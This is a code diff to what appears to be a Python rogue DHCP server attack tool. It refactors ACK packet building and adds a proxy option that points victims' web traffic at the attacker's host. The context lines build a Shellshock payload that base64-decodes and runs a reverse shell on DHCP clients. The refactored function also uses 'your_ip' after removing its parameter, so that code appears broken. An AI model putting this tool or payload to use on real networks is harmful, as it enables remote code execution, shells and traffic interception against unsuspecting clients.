@@ -49,6 +49,7 @@ network_broadcast = None
 dns_server_ip_address = None
 number_of_dhcp_request = 0
 shellshock_url = None
+proxy = None
 
 if args.interface is None:
     current_network_interface = Base.netiface_selection()
@@ -132,39 +133,22 @@ def make_dhcp_offer_packet(transaction_id):
                                      url=None)
 
 
-def make_dhcp_ack_packet(transaction_id, requested_ip, your_ip=None, url=True):
-    if your_ip is None:
-        your_ip = requested_ip
-    if url:
-        return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
-                                         destination_mac=target_mac_address,
-                                         source_ip=dhcp_server_ip_address,
-                                         destination_ip=requested_ip,
-                                         transaction_id=transaction_id,
-                                         your_ip=your_ip,
-                                         client_mac=target_mac_address,
-                                         dhcp_server_id=dhcp_server_ip_address,
-                                         lease_time=args.lease_time,
-                                         netmask=network_mask,
-                                         router=router_ip_address,
-                                         dns=dns_server_ip_address,
-                                         dhcp_operation=5,
-                                         url=shellshock_url)
-    else:
-        return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
-                                         destination_mac=target_mac_address,
-                                         source_ip=dhcp_server_ip_address,
-                                         destination_ip=requested_ip,
-                                         transaction_id=transaction_id,
-                                         your_ip=your_ip,
-                                         client_mac=target_mac_address,
-                                         dhcp_server_id=dhcp_server_ip_address,
-                                         lease_time=args.lease_time,
-                                         netmask=network_mask,
-                                         router=router_ip_address,
-                                         dns=dns_server_ip_address,
-                                         dhcp_operation=5,
-                                         url=None)
+def make_dhcp_ack_packet(transaction_id, requested_ip):
+    return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
+                                     destination_mac=target_mac_address,
+                                     source_ip=dhcp_server_ip_address,
+                                     destination_ip=requested_ip,
+                                     transaction_id=transaction_id,
+                                     your_ip=your_ip,
+                                     client_mac=target_mac_address,
+                                     dhcp_server_id=dhcp_server_ip_address,
+                                     lease_time=args.lease_time,
+                                     netmask=network_mask,
+                                     router=router_ip_address,
+                                     dns=dns_server_ip_address,
+                                     dhcp_operation=5,
+                                     url=shellshock_url,
+                                     proxy=proxy)
 
 
 def make_dhcp_nak_packet(transaction_id, requested_ip):
@@ -215,7 +199,7 @@ def dhcp_reply(request):
             flags = request[BOOTP].flags
 
             print "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
-                  " || requested ip: " + ciaddr
+                  " || client ip: " + ciaddr
 
             option_operation = pack("!3B", 53, 1, 5)  # DHCPACK operation
             option_netmask = pack("!" "2B" "4s", 1, 4, inet_aton(network_mask))
@@ -226,14 +210,6 @@ def dhcp_reply(request):
 
             option_router = pack("!" "2B" "4s", 3, 4, inet_aton(router_ip_address))
             option_dns = pack("!" "2B" "4s", 6, 4, inet_aton(dns_server_ip_address))
-            option_lease_time = pack("!" "2B" "L", 51, 4, 60)
-
-            if args.proxy is None:
-                proxy = bytes("http://" + dhcp_server_ip_address + ":8080")
-            else:
-                proxy = bytes(args.proxy)
-            proxy = pack("!%ds" % (len(proxy)), proxy)
-            option_proxy = pack("!2B", 252, len(proxy)) + proxy
 
             option_server_id = pack("!" "2B" "4s", 54, 4, inet_aton(dhcp_server_ip_address))  # Set server id
             option_end = pack("B", 255)
@@ -299,6 +275,11 @@ def dhcp_reply(request):
                     b64shell = b64encode(net_settings + reverse_shell)
                     shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
 
+                global proxy
+                if args.proxy is None:
+                    proxy = bytes("http://" + dhcp_server_ip_address + ":8080")
+                else:
+                    proxy = bytes(args.proxy)
 
                 ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
                 SOCK.send(ack_packet)
